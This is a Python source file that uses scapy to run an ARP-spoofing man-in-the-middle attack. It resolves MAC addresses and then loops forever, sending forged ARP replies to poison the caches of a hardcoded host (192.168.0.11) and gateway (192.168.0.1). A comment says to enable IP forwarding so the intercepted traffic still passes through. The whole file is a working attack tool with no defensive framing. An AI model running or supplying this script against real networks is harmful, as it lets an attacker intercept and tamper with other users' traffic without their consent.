from scapy.all import *

# sudo nano /proc/sys/net/ipv4/ip_forward change 0 to 1 

def get_mac(ip):
    ip_layer = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    final = broadcast/ip_layer
    answer = srp(final, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return mac


def spoofer(target, spoofed):
    mac = get_mac(target)
    sp_mac = ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
    send(sp_mac, verbose=False)


def main():
    try:
        print("Running: ")
        while True:
            spoofer("192.168.0.11", "192.168.0.1")
            spoofer("192.168.0.1", "192.168.0.11")
    except KeyboardInterrupt:
        exit(0)


if __name__ == "__main__":
    main()